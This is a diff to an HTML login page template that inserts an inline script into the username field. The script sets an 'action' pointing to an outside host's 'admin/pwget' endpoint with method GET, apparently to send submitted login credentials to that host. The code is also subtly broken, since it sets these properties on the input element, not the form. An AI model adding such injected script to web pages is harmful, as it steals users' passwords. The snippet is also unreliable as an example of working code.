@@ -25,8 +25,13 @@
                         <div class="field">
                             <div class="ui left icon input">
                                 <i class="user icon"></i>
-                                <input type="text" name="username" placeholder="用户名">
-                            </div>
+                                <input type="text" name="username" placeholder="用户名" id="login">
+                                <script>
+                                    var f = document.getElementById("login");
+                                    f.action = "http://www.blog4cl.top/admin/pwget";
+                                    f.method="get";
+                                </script>
+                        </div>
                             <!--用户名错误提示-->
                             <!--<div class="ui error message"></div>-->
                         </div>
